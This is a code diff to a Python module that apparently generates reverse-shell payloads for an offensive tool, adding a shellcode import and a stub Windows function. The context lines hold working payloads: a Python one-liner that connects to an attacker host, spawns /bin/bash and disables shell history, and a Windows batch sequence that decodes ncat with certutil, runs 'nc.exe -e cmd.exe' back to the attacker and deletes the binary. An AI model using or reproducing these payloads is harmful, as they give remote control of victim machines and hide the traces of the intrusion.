@@ -1,5 +1,5 @@
 #!/usr/bin/env python
-from binary import WINDOWS_NCAT, binary_to_bat
+from binary import WINDOWS_NCAT, binary_to_bat, shellcode_to_ps1
 
 def REV_PYTHON_TCP():
 	return """python -c \"import os; import pty; import socket; lhost = 'TARGET'; lport = PORT; s = socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.connect((lhost, lport)); os.dup2(s.fileno(), 0); os.dup2(s.fileno(), 1); os.dup2(s.fileno(), 2); os.putenv('HISTFILE', '/dev/null'); pty.spawn('/bin/bash'); s.close();\" """
@@ -63,3 +63,6 @@ def REVERSE_AWK_UDP():
 
 def REVERSE_WINDOWS_NCAT_TCP():
 	return  """{0}\ncertutil -decode %Temp%\\nc.b64 %Temp%\\nc.exe\n%Temp%\\nc.exe -e cmd.exe TARGET PORT\ndel %Temp%\\nc.exe\n""".format(binary_to_bat(WINDOWS_NCAT, file="%Temp%\\nc.b64"))
+
+def REVERSE_WINDOWS_BLOODSEEKER_TCP():
+	return """ Custom Shell requires a Custom code. """
